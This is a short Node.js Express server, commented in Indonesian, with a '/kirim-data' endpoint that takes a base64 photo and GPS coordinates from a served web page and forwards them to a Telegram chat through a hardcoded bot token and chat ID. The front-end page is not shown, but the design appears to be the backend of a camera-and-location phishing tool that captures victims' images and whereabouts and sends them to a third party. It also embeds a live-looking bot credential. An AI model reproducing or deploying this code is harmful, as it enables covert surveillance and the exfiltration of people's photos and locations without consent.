const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
const port = 3000;

// Ganti dengan token bot dan Chat ID Anda
const TELEGRAM_BOT_TOKEN = '8399020540:AAE-GBRbJtCU-XYeBrSdiziCpZKvT__cQew';
const CHAT_ID = '7851258138';

app.use(express.json());

// Middleware untuk Permissions-Policy dan CSP
app.use((req, res, next) => {
    res.set('Permissions-Policy', 'unload=()');
    res.set('Content-Security-Policy', "script-src 'self' 'unsafe-eval'");
    next();
});

// Routes untuk menyajikan file HTML dan JS
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.get('/script.js', (req, res) => {
    res.sendFile(__dirname + '/script.js');
});

// Endpoint untuk menerima data dari halaman web
app.post('/kirim-data', async (req, res) => {
    const { foto, lokasi } = req.body;

    try {
        if (foto) {
            // Mengirim foto ke Telegram
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', '');
            // Foto adalah base64, ekstrak data setelah comma
            const base64Data = foto.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            formData.append('photo', buffer, { filename: 'photo.jpg', contentType: 'image/jpeg' });

            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
                headers: formData.getHeaders()
            });
        }

        if (lokasi) {
            // Mengirim lokasi ke Telegram
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
                chat_id: CHAT_ID,
                latitude: lokasi.latitude,
                longitude: lokasi.longitude
            });
        }

        res.status(200).send('Data berhasil dikirim ke Telegram.');
    } catch (error) {
        console.error('Gagal mengirim ke Telegram:', error);
        res.status(500).send('Gagal mengirim data.');
    }
});

app.listen(port, () => {
    console.log(`Server berjalan di http://localhost:${port}`);
});
